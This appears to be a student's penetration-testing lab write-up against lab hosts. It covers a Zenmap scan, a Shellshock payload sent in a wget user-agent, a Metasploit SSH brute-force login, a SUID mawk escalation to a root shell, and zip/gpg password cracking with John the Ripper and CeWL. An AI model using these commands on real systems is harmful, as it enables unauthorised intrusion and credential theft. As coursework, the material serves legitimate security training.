Name:
GT Login ID: mhuang366

Task 1: 
run the "ip a" in the VM, then take 172.22.0.1/24, then run the zenmap, enter 172.22.0.1/24 to target, then select the profile as "intense scan, all TCP ports" in the dropdownlist and click Scan to start. The IP address and Port and type are returned by the zenmap scan.

Task 2:
run below command in VM terminal:
wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/task2 mhuang366" http://172.22.0.10:8088/cgi-bin/shellshock.cgi
the command "() { test;};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/task2 mhuang366" was ran on the container side, and the result is saved to VM as a file. The file content is:
Here is your task2 hash:
f7b6e16c47108233a082db3413960b7b13e35670d658655f6d5bd1c98439e136

Task 3:
I use this command to find the location of the files:
find / -type f -name "unix_passwords.txt" 2>/dev/null
find / -type f -name "unix_users.txt" 2>/dev/null
Then, I used below options to run Metasploit

use auxiliary/scanner/ssh/ssh_login
set RHOSTS 172.22.0.1
set STOP_ON_SUCCESS true
set RPORT 9280
set USER_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/unix_users.txt
set PASS_FILE /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
Then, I was able to get the shell session

Task 4:
With the shell session obtain in Task3, I used below command to find out the files that has SUID config.
find / -type f -perm -04000 -ls 2>/dev/null
after finding the /usr/bin/mawk
  2129456    168 -rwsr-xr-x   1 root     root         170768 Apr  8  2024 /usr/bin/mawk
I use this command to obtain the shell with Root:
/usr/bin/mawk 'BEGIN {system("/bin/sh")}'

Task 5:
As given in the list, I obtain the password for Task51.zip:
1) zip2john task51.zip > task51.hash
2) john task51.hash 
3) step 2 returned the password
4) unzip the file with the password
5) execute task51 mhuang366, then obtain the hashcode

For test 5.2, 
1) I use command cewl  http://172.22.0.10:8088/cgi-bin/shellshock.cgi -d 20 -w wordlist_new.txt to generate the wordlist_new.txt file
2) execute below command to obtain the hash for test52.gpg, using file name task52.hash
  gpg2john task52.gpg > task52.hash
3) execute: john --wordlist=/home/penteststudent/wordlist_new.txt task52.hash
 
